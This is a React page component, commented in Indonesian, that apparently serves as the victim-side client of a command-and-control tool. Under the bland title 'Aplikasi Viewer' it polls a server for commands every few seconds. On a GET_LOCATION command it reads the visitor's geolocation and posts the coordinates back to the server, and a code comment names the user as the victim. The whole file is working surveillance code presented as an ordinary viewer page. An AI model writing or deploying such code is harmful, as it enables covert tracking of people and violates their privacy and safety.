import { useState, useEffect } from 'react';

export default function Home() {
  const [command, setCommand] = useState('Menunggu perintah...');
  const [logs, setLogs] = useState([]);

  // Korban polling perintah dari server
  useEffect(() => {
    const interval = setInterval(async () => {
      const res = await fetch('/api/getCommand');
      const data = await res.json();
      if (data.command) {
        setCommand(data.command);
        // Jika perintah adalah untuk eksekusi di web (contoh: get location)
        if (data.command === 'GET_LOCATION' && navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            const loc = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`;
            fetch('/api/log', { method: 'POST', body: JSON.stringify({ log: loc }) });
          });
        }
      }
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div>
      <h1>Aplikasi Viewer</h1>
      <p>Perintah saat ini: <strong>{command}</strong></p>
      <div id="logs">
        <h3>Log Aktivitas:</h3>
        {logs.map((log, idx) => <p key={idx}>{log}</p>)}
      </div>
    </div>
  );
            }
